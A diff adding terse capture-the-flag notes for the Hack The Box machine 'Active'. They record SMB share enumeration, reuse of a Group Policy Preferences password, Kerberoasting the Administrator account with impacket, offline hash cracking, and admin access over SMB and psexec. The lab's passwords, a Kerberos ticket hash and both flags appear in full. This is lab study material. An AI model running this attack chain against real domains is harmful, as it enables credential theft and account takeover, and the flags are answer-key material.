@@ -1,0 +1,86 @@
+HTC - Active - https://www.hackthebox.eu/home/machines/profile/148
+VERSIÓN 2 - IPSEC
+
+https://jugulaire.github.io/Active/
+https://0xrick.github.io/hack-the-box/active/
+
+smbmap -r Replication -H 10.10.10.100 
+
+[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Replication                                             READ ONLY
+        .\Replication\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
+
+smbclient //10.10.10.100/Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
+
+smbmap -R Replication -H 10.10.10.100 
+
+smbmap -d active.htb -H 10.10.10.100 -R Replication
+
+smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
+
+
+smbclient //10.10.10.100/Users -U SVC_TGS
+GPPstillStandingStrong2k18
+
+Try "help" to get a list of possible commands.
+smb: \> 
+
+smb: \SVC_TGS\Desktop\> ls
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                            A       34  Sat Jul 21 11:06:25 2018
+
+
+                10459647 blocks of size 4096. 4925049 blocks available
+
+smb: \SVC_TGS\Desktop\> get user.txt
+
+  102  smbclient //10.10.10.100/Users -U SVC_TGS
+  103  cat user.txt
+
+root@kali:/# cat user.txt
+86d67d8ba232bb6a254aa4d10159e983
+
+
+./GetUserSPNs.py -request active.htb/SVC_TGS
+./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Ticketmaster1968
+
+./psexec.py administrator@active.htb
+C:\Users\Administrator\Desktop\root.txt
+
+root@kali:~/active# smbmap -H 10.10.10.100 -u "SVC_TGS" -d "active.htb" -p "GPPstillStandingStrong2k18"
+[+] Finding open SMB ports....
+
+
+git clone https://github.com/CoreSecurity/impacket
+python install.py install 
+./GetUserSPNs.py -request -dc-ip 10.10.10.100 "active.htb/SVC_TGS:GPPstillStandingStrong2k18" 
+
+root@kali:~/active# hashcat -m 13100 tocrack /usr/share/wordlists/rockyou.txt -o cracked.txt
+
+
+root@kali:~/active# cat cracked.txt 
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$1c217979ebf88cf846e21722dc521e70$1d96b4aadb55f5d6474617bf350567da599f8cf6abf2e976faafa53c26eaa65668a6716e2cbd7c74860a066f98ccd4884976dbf2d77667972b959f3d248748da94b271ef28f7f0292288371c90fe9b36989a9b3c3886f69cd0d44f45b1ab0962678e5e88736163ab060df319697c212644550432947a7649a2e4c074fadeb824e86bac491230304899dae8c51d72d5646b9d52df8ac0bf1204d2a2c9d83cea965665aee257e4562940c8e802d793c82e8504f7e29e16a0922f3c3ebec89ef2b06553dfc5c9c5e55cb2ac521827133bd492a787b93fba32ec22764808b454cb549b2019c9d925c9e87dffb10270402a282703bfa687e005c3347ccacff3f4e1f8089421d08b7f018b3e94fc3c2e9f12b744d449751db1d638e779039d7b374423bcfee5c83f1120c81a8889435fa943a72886a6a6da2f847d3e902ca1bee4198a3320b25bf69b0ca056daa2573253306c0e4f2edffc9d6caa814fbce1b3cd99d1bcd04f5a82feeb53bafe0aa90e72c11ecfa35737e3f5c11833a4ab11aefe502a6bdbd2b394c9a20d6afc6e894d2740dc5bfcf31eca5b91b01ff3c9b1c9de4b24b6f95ef71d7b71fd129e2668c98c61bd3039dc4a42d1e4827620a62ef0775fe7a41cfab6038c1ae6bb2c7cba3e69c39320d95034ec1364f8f499f9db30485404e23c138b43d1e0c03d2ad2e62310d9384144ee4aa55586ee3b941d199be3d4919e6b72caa893c884a9e9a7091545db7339534ce1dc5467220dff0d4bc83bc38f917479faccf68c6a3c5efc1add19721d39ee7d35eea8041398537996e676ce28f36d5a51a247f04453746138c317e023ea041fd8608e1e530eecbc1937b52f6520c36c4d0750c18ee89661914ee87a72afc949961e8e2a273352714f973320c6b1f9fb13cee481a2e140e420a72891c8d6d3493b923ac9327edb0c37dd847d55842c6023f56a8e5c00abe743bff96e4faa0d4e9e45eccab107eb7e567ac75c0b166609d93af967616e1ba14eacab1f95c559b2fd46e7dc69065026ad5e6df0e94896161e3de9f6836697b48e820adf5c349cf9137a0efa54d8b782ee5d564be7ccb573ceece05c9ab0f922ca77599a08a3be8e19cb227a8b79edb0057bbd01249cb4e3ed76c2ac80ae47cb4987a65d95bff25c2e9a7580ab5875899df182cac2fcfa428206b47ed5e872365d72ffb08b49dc40cb14f9eb182ca678ea635b50940ab6eec0fee72c1d96b33a84fe4587426d2c69168a7728ccc63d:Ticketmaster1968
+
+
+root@kali:~/active/JohnTheRipper/run# smbclient //10.10.10.100/Users -U "Administrator" -W "active.htb"                                                        
+WARNING: The "syslog" option is deprecated                                     
+Enter ACTIVE.HTB\Administrator's password:                                     
+Try "help" to get a list of possible commands.
+
+
+smb: \Administrator\Desktop\> get root.txt                                     
+getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+smb: \Administrator\Desktop\> exit
+root@kali:~/active/JohnTheRipper/run# cat root.txt                             
+b5fc76d1d6b91d77b2fbf2d54d0f708b
+
+
+
+
